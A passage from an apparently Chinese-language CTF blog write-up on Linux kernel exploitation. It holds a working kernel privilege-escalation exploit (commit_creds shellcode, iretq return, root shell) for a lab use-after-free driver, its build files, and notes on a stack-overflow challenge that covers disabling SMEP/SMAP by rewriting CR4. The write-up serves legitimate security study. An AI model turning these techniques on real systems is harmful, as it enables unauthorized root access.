    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
    <span class="n">hex</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">//chmod("/flag",0777);</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="n">shell_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_root_shell</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">shellcode</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
    <span class="c1">// restore_flags</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"nop;"</span>
        <span class="s">"nop;"</span>
        <span class="s">"push user_ss;"</span>
        <span class="s">"push user_sp;"</span>
        <span class="s">"push user_rflags;"</span>
        <span class="s">"push user_cs;"</span>
        <span class="s">"push shell_addr;"</span>
        <span class="s">"swapgs;"</span>
        <span class="s">"iretq;"</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="n">save_status</span><span class="p">();</span>
    <span class="c1">//bind_core(0);</span>
  
    <span class="kt">char</span> <span class="n">procn</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/dev/uaf_device"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">procn</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sc_addr</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>Makefile</li>
</ul>

<p>‍</p>

<div class="language-make highlighter-rouge"><div class="code-header">
        <span data-label-text="Makefile"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nv">CC</span> <span class="o">=</span> gcc
<span class="nv">CFLAGS</span> <span class="o">=</span> <span class="nt">-nostdlib</span> <span class="nt">-fpie</span> <span class="nt">-static</span> <span class="nt">-ffreestanding</span> <span class="nt">-std</span><span class="o">=</span>c++2a <span class="nt">-mno-sse</span> <span class="nt">-mno-mmx</span> <span class="nt">-mno-avx</span> <span class="nt">-masm</span><span class="o">=</span>intel

<span class="nl">exploit</span><span class="o">:</span> <span class="nf">exp.c</span>
	<span class="p">$(</span>CC<span class="p">)</span> <span class="p">$(</span>CFLAGS<span class="p">)</span> <span class="nv">$&lt;</span> <span class="nt">-o</span> <span class="nv">$@</span>

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>minilib.h</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre></td><td class="rouge-code"><pre>

<span class="cp">#define O_RDONLY    0   </span><span class="cm">/* Open read-only.  */</span><span class="cp">
#define O_WRONLY    1   </span><span class="cm">/* Open write-only.  */</span><span class="cp">
#define O_RDWR      2   </span><span class="cm">/* Open read/write.  */</span><span class="cp">
#define O_CREAT     0x40</span><span class="cm">/* New File. */</span><span class="cp">
</span>

<span class="c1">// bind_core</span>
<span class="cp">#define MAX_CPUS 1024
</span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits</span><span class="p">[</span><span class="n">MAX_CPUS</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">))];</span> <span class="p">}</span> <span class="n">cpu_set_t</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="n">cpu_set_t</span> <span class="o">*</span><span class="n">set</span><span class="p">)</span> <span class="p">{</span> <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_CPUS</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="n">set</span><span class="o">-&gt;</span><span class="n">bits</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">CPU_SET</span><span class="p">(</span><span class="kt">int</span> <span class="n">core</span><span class="p">,</span> <span class="n">cpu_set_t</span> <span class="o">*</span><span class="n">set</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">core</span> <span class="o">/</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">core</span> <span class="o">%</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">));</span>
    <span class="n">set</span><span class="o">-&gt;</span><span class="n">bits</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="mi">1UL</span> <span class="o">&lt;&lt;</span> <span class="n">offset</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">syscall64</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov rax, rdi;"</span>
        <span class="s">"mov rdi, rsi;"</span>
        <span class="s">"mov rsi, rdx;"</span>
        <span class="s">"mov rdx, rcx;"</span>
        <span class="s">"mov r10, r8 ;"</span>
        <span class="s">"mov r8 , r9 ;"</span>
        <span class="s">"mov r9 , [rsp + 8];"</span>
        <span class="s">"syscall;"</span>
    <span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span><span class="kt">int</span> <span class="n">prot</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="n">prot</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">ioctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">execve</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="kt">size_t</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">environ</span><span class="p">){</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">environ</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">sendfile</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">dst_fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">src_fd</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">){</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">dst_fd</span><span class="p">,</span> <span class="n">src_fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">chmod</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">filepath</span><span class="p">,</span><span class="kt">int</span> <span class="n">mode</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x5a</span><span class="p">,</span> <span class="n">filepath</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">getuid</span><span class="p">(){</span><span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x66</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">getpid</span><span class="p">(){</span><span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0x27</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">sched_setaffinity</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">cpusetsize</span><span class="p">,</span> <span class="k">const</span> <span class="n">cpu_set_t</span> <span class="o">*</span><span class="n">cupset</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">syscall64</span><span class="p">(</span><span class="mh">0xcb</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">cpusetsize</span><span class="p">,</span> <span class="n">cupset</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">bind_core</span><span class="p">(</span><span class="kt">int</span> <span class="n">core</span><span class="p">){</span>
    <span class="n">cpu_set_t</span> <span class="n">cpu_set</span><span class="p">;</span>
    <span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu_set</span><span class="p">);</span>
    <span class="n">CPU_SET</span><span class="p">(</span><span class="n">core</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cpu_set</span><span class="p">);</span>
    <span class="n">sched_setaffinity</span><span class="p">(</span><span class="n">getpid</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cpu_set</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cpu_set</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">puts</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">Str</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">length</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span><span class="p">(</span><span class="n">Str</span><span class="p">[</span><span class="n">length</span><span class="p">]</span><span class="o">!=</span><span class="mi">0</span><span class="p">){</span><span class="o">++</span><span class="n">length</span><span class="p">;}</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">Str</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">hex</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">IntHex</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">idx</span> <span class="o">=</span> <span class="mh">0x18</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0123456789ABCDEF"</span><span class="p">[</span><span class="n">IntHex</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">];</span>
        <span class="n">IntHex</span> <span class="o">&gt;&gt;=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">IntHex</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="sc">'0'</span><span class="p">;</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="sc">'x'</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">idx</span><span class="o">--</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">strncpy</span><span class="p">(</span><span class="kt">char</span> <span class="n">dst</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">src</span><span class="p">[],</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">){</span>
    <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\x00'</span><span class="p">;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="问题及感想"><span class="me-2">问题及感想</span><a href="#问题及感想" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>返回用户态然后准备执行 execve /bin/sh, 发现 <code class="language-plaintext highlighter-rouge">execve("/bin/sh",0,0);</code>​ 竟然不行.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>
<span class="c1">// 我不行，因为没参数？</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>


<span class="c1">// 加了 argv 就正常了操</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916213215-v4sxaw1.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916213215-v4sxaw1.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="kylin_overflow"><span class="me-2">Kylin_Overflow</span><a href="#kylin_overflow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="附件-1"><span class="me-2">附件</span><a href="#附件-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005922-rvs1i6v.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005922-rvs1i6v.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="保护及init"><span class="me-2">保护及init</span><a href="#保护及init" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">kaslr</code>​ 开启了地址随机化</li>
  <li>​<code class="language-plaintext highlighter-rouge">+smep,+smap</code>​ 隔离了 用户段和kernel 段</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-m</span> 256M <span class="se">\</span>
    <span class="nt">-kernel</span> bzImage <span class="se">\</span>
    <span class="nt">-initrd</span> rootfs.cpio <span class="se">\</span>
    <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"root=/dev/ram console=ttyS0 loglevel=8 ttyS0,115200 kaslr"</span> <span class="se">\</span>
    <span class="nt">-cpu</span> kvm64,+smep,+smap <span class="se">\</span>
    <span class="nt">-netdev</span> user,id<span class="o">=</span>t0, <span class="nt">-device</span> e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-no-reboot</span> <span class="se">\</span>
    <span class="nt">-s</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>init</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="nb">mkdir</span> /tmp
<span class="nb">mkdir</span> /proc
<span class="nb">mkdir</span> /sys
mount <span class="nt">-t</span> proc none /proc
mount <span class="nt">-t</span> sysfs none /sys
mount <span class="nt">-t</span> debugfs none /sys/kernel/debug
mount <span class="nt">-t</span> devtmpfs devtmpfs /dev
mount <span class="nt">-t</span> tmpfs none /tmp
mdev <span class="nt">-s</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Boot took </span><span class="si">$(</span><span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> /proc/uptime<span class="si">)</span><span class="s2"> seconds"</span>

<span class="c"># 存在漏洞的驱动文件</span>
insmod /lib/modules/5.10.0-9-generic/kernel/test.ko
<span class="nb">chmod </span>666 /dev/test

<span class="c">#setsid /bin/cttyhack setuidgid 1000 /bin/sh</span>
setsid /bin/cttyhack setuidgid 0 /bin/sh

poweroff <span class="nt">-d</span> 0  <span class="nt">-f</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="分析-ko-驱动"><span class="me-2">分析 .ko 驱动</span><a href="#分析-ko-驱动" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>主要 用 ioctl 交互</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918010659-w7mz2no.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918010659-w7mz2no.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>栈溢出漏洞</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918010719-qblutf1.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918010719-qblutf1.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>一个 gadget</li>
</ul>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918010813-2czm38d.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918010813-2czm38d.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="整体思路-1"><span class="me-2">整体思路</span><a href="#整体思路-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>不知大这里给控制cr4寄存器有什么用</li>
</ul>

<p>‍</p>

<p>‍</p>

<p>先泄露 kernel 地址，然后 利用 stack 溢出</p>

<p>‍</p>

<p>然后我注意到 <code class="language-plaintext highlighter-rouge">gadget</code>​ 处的 <code class="language-plaintext highlighter-rouge">mov cr4,rdi;retn</code>​  后面搜了搜 cr4 寄存器的作用</p>

<ul>
  <li>cr4 寄存器结构</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918012723-fsk3jk0.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918012723-fsk3jk0.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>smep是由CR4寄存器来决定是否开启的, 在kernel中由CR4寄存器的第20位设置是否开启</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918011728-6fyypyz.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918011728-6fyypyz.png" alt="image" loading="lazy"></a>​</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nf">bin</span><span class="p">(</span><span class="mh">0x3006f0</span><span class="p">)</span>
<span class="sh">'</span><span class="s">0b1100000000011011110000</span><span class="sh">'</span>


<span class="c1"># 第20位也就是0x100000
</span><span class="o">&gt;&gt;&gt;</span> <span class="nf">hex</span><span class="p">(</span><span class="mh">0x3006f0</span><span class="o">-</span><span class="mh">0x100000</span><span class="p">)</span>
<span class="sh">'</span><span class="s">0x2006f0</span><span class="sh">'</span>


<span class="c1"># cr4 = 
# 0x3006f0 -&gt; 0x6f0
# 即可关闭 smep 保护
</span></pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>猜测后高位的 这俩 1 分别是 <code class="language-plaintext highlighter-rouge">+smep</code>​ 和 <code class="language-plaintext highlighter-rouge">+smap</code>​ 保护 ，直接把他们都清空应该就算关闭保护了</li>
</ul>

<p><a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918012038-vum3w1j.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918012038-vum3w1j.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>然后….., 先记住吧，但是给了这个 gadget 感觉 应该可以直接改吧</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918012609-pvg3b0r.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918012609-pvg3b0r.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>然后也是简单的试了一下改 cr4 寄存器， 然后就 crush</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918120838-yoysdwi.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918120838-yoysdwi.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
